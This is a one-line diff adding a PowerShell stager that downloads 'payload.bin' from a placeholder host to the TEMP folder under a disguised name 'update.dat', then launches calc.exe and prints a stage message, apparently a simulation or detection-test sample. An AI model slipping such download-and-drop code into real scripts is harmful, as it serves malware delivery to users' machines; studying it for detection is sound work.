@@ -1,0 +1,1 @@
+$Stage1Url = "http://contoso.com/payload.bin"; $DropPath = "$env:TEMP\update.dat"; Start-BitsTransfer -Source $Stage1Url -Destination $DropPath; & 'calc.exe'; Write-Output "stage 21 initialized"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
